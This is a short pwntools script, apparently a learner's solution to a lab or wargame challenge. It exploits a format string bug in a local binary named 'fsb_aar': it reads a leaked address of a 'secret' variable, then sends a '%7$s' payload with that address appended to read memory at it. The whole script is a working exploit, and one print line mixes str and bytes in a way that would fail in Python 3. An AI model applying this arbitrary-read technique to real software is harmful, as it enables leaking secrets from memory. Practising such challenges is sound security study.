from pwn import *
p = process("./fsb_aar")
p.recvuntil("`secret`: ")
addr_secret = int(p.recvline()[:-1], 16)
print("addr_secret : "+hex(addr_secret))
fstring = b"%7$s".ljust(8) # ljust(8) for padding, but why is it %7$s? 
fstring += p64(addr_secret) 
print("fstring : "+fstring)
p.sendline(fstring)
p.interactive()